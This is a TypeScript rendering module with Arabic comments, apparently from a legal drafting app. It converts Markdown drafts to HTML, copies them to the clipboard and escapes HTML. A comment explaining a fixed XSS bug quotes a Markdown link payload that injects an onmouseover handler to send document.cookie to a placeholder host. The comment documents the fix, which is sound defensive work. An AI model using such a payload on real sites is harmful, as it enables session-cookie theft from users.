// عارض المسودّة في الواجهة والطباعة — يبني من الكتل نفسها التي يبني منها مصدِّر Word.
//
// القراءة في `src/lib/draftText.ts`، ملفٌّ واحد يستورده الخادم والواجهة: ما يراه
// المحامي في المحادثة وما يُطبع PDF وما يُصدَّر Word مستندٌ واحد، ولا تظهر في
// أحدها علامةٌ (`###`، `**`) فهمها الآخر.
import { parseDraft, splitDocTitle, toPlainText, type Block, type Inline } from '../../../src/lib/draftText';

export { splitDocTitle, toPlainText };

export function renderMarkdown(md: string): string {
  /* كل وسمٍ في سطرٍ مستقل، كما كان العارض السابق يكتبه: التظليل المحفوظ
     إزاحاتٌ على نصّ العرض (`lib/highlight.ts`)، والفاصل بين الأسطر جزءٌ من
     ذلك النصّ — فلو تغيّر لانزاح كل تظليلٍ يقع بعد قائمة. */
  const out: string[] = [];
  // القوائم المفتوحة، من الأقرب إلى الأعمق — عنصرٌ أعمق يفتح قائمةً داخل سابقه.
  const open: { tag: 'ul' | 'ol'; depth: number }[] = [];
  const closeTop = () => {
    out[out.length - 1] += '</li>';
    out.push(`</${open.pop()!.tag}>`);
  };
  const closeDeeperThan = (depth: number) => {
    while (open.length && open[open.length - 1].depth > depth) closeTop();
  };

  for (const b of parseDraft(md)) {
    if (b.kind !== 'item') {
      closeDeeperThan(-1);
      out.push(block(b));
      continue;
    }
    const tag = b.ordered ? 'ol' : 'ul';
    closeDeeperThan(b.depth);
    // قائمةٌ من نوعٍ آخر في العمق نفسه تُغلق، وتُفتح بعدها قائمة هذا العنصر.
    if (open.length && open[open.length - 1].depth === b.depth && open[open.length - 1].tag !== tag) closeTop();
    if (open.length && open[open.length - 1].depth === b.depth) {
      out[out.length - 1] += '</li>';
      out.push(`<li>${inline(b.inl)}`);
      continue;
    }
    // القائمة المرقّمة تبدأ من رقمها المكتوب: طلباتٌ يقطعها سطرٌ تبقى «٣» لا تعود «١».
    const start = b.ordered ? startOf(b.marker) : 1;
    out.push(`<${tag}${start !== 1 ? ` start="${start}"` : ''}>`);
    out.push(`<li>${inline(b.inl)}`);
    open.push({ tag, depth: b.depth });
  }
  closeDeeperThan(-1);
  return out.join('\n');
}

/**
 * نسخ المسودّة كما تُعرض لا كما كُتبت.
 *
 * كان النسخ يضع نصّ Markdown في الحافظة، فيلصقه المحامي في Word أو في بريدٍ
 * إلى العميل بعلاماته: `###` و`**`. والآن نسختان معاً: HTML يلصقه Word ومحرّر
 * البريد بعناوينه وتغليظه، ونصٌّ مجرّد لما لا يقرأ إلا النصّ. وحيث لا يُتاح
 * `ClipboardItem` يُنسخ النصّ المجرّد وحده.
 */
export async function copyDraft(md: string): Promise<void> {
  const text = toPlainText(md);
  try {
    if (typeof ClipboardItem !== 'undefined' && navigator.clipboard?.write) {
      const html = `<div dir="rtl" lang="ar">${renderMarkdown(md)}</div>`;
      await navigator.clipboard.write([
        new ClipboardItem({
          'text/html': new Blob([html], { type: 'text/html' }),
          'text/plain': new Blob([text], { type: 'text/plain' }),
        }),
      ]);
      return;
    }
  } catch {
    // متصفّحٌ يعرف `ClipboardItem` ويرفض HTML — يُنسخ النصّ المجرّد أدناه.
  }
  await navigator.clipboard?.writeText(text).catch(() => {});
}

function block(b: Exclude<Block, { kind: 'item' }>): string {
  switch (b.kind) {
    case 'heading':
      return `<h${b.level}>${inline(b.inl)}</h${b.level}>`;
    case 'quote':
      return `<blockquote><p>${inline(b.inl)}</p></blockquote>`;
    case 'rule':
      return '<hr>';
    case 'table': {
      const head = b.header ? `<thead><tr>${b.header.map((c) => `<th>${inline(c)}</th>`).join('')}</tr></thead>` : '';
      const rows = b.rows.map((r) => `<tr>${r.map((c) => `<td>${inline(c)}</td>`).join('')}</tr>`).join('');
      // على شاشةٍ ضيّقة يُمرَّر الجدول وحده ولا تتمدّد الصفحة.
      return `<div class="table-scroll"><table>${head}<tbody>${rows}</tbody></table></div>`;
    }
    default:
      return `<p>${inline(b.inl)}</p>`;
  }
}

function startOf(marker: string): number {
  const digits = marker.replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 0x0660)).replace(/\D/g, '');
  const n = parseInt(digits, 10);
  return Number.isFinite(n) && n > 0 ? n : 1;
}

function inline(list: Inline[]): string {
  return list
    .map((x) => {
      let h = escapeHtml(x.text);
      if (x.href) h = `<a href="${escapeHtml(x.href)}" target="_blank" rel="noopener">${h}</a>`;
      return x.bold ? `<strong>${h}</strong>` : h;
    })
    .join('');
}

/**
 * تهريب ما لا يجوز أن يُقرأ بنيةً.
 *
 * **وعلامتا الاقتباس منه، وغيابهما كان ثغرةً لا نقصَ أناقة.** نمطُ الرابط
 * أعلاه يضع ما التقطه داخل `href="…"`، ونمطُه يمنع الفراغَ والقوسَ المغلق
 * ولا يمنع `"`. والشرطة المائلة فاصلُ سماتٍ صالح في تحليل HTML5 — تُقرأ
 * «إغلاق ذاتيّ» ثم يُعاد ما بعدها في حالة «قبل اسم سمة». فهذا المدخل:
 *
 *   [نصّ](https://a/b"/onmouseover="location='//x/'+document.cookie)
 *
 * كان يخرج وسمَ رابطٍ يحمل معالجَ حدثٍ حيّاً. أُعيد إنتاجه في متصفّح.
 *
 * ولا يكفي أن يُهرَّب `"` وحده: `'` يفتح البابَ نفسه في سمةٍ تُكتب بالمفرد،
 * وهذا الملف يُقرأ ويُعدَّل بعد اليوم. فالأربعة تُهرَّب كلُّها.
 */
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
